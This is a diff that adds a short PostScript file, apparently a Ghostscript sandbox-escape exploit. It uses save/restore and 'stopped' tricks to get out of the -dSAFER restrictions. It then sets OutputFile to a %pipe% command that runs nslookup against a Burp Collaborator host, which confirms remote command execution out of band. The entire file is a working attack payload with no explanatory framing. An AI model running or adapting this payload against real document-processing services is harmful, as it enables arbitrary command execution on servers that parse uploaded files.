@@ -1,0 +1,8 @@
+%!PS
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%nslookup NN.q8z4m1jwxf4bu1tu50pq70j84zas0gp.burpcollaborator.net) currentdevice putdeviceprops
